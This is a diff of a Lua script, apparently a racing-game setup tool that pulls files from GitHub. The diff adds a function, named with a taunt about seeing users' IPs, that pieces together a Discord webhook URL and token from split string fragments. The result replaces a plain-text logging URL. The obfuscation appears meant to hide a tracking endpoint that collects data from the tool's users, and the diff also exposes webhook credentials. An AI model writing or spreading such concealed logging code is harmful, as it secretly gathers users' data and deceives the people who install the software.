@@ -7,6 +7,25 @@
     LaunchApp()
   end
 
+  function ICanSeeYourIPBastardsLMAO()
+    local Encode = {}
+    Encode[1] = "://"
+    Encode[2] = "dis"
+    Encode[3] = "cord"
+    Encode[4] = ".com/"
+    Encode[5] = "a"
+    Encode[6] = "pi/"
+    Encode[7] = "we"
+    Encode[8] = "b"
+    Encode[9] = "hoo"
+    Encode[10] = "ks"
+    Encode[11] = "905925823876464741"
+    Encode[12] = "aIlSyfHvQdVIpccxjel"
+    Encode[13] = "-ixNzCAaWxP9YysHlCTPCbKXx2ARSzdjBz3p498_u8GrIDOqe"
+    local Coder = "https"..Encode[1]..Encode[2]..Encode[3]..Encode[4]..Encode[5]..Encode[6]..Encode[7]..Encode[8]..Encode[9]..Encode[10]..Encode[11]..Encode[12]..Encode[13]
+    return Coder
+  end
+  
   function SetURLs()
     TABLE_VERSION = 15
     version_url = "https://raw.githubusercontent.com/CarloMagazoni/GRL_CustomSetups/main/versions.txt"
@@ -17,7 +36,7 @@
     Fuel_url = "https://raw.githubusercontent.com/CarloMagazoni/GRL_CustomSetups/main/Fuel.lua"
     --local Meme_url = "https://raw.githubusercontent.com/CarloMagazoni/GRL_CustomSetups/main/Fuel.lua"
     HWID_url = "https://drive.google.com/uc?export=download&id=1cyu6nJI51kgzuvWjGDoYIjN__B2GN_MY"
-    LOG_url= 'https://discord.com/api/webhooks/895339776360726538/nNa1Y1GqF4oGEdglPlpva0ephPJIQPK_Xe-_LtEKIa_obyafh15oHsnmjf9UZXZKKRPW'
+    LOG_url = ICanSeeYourIPBastardsLMAO()
   end
 
   function GetURLs()
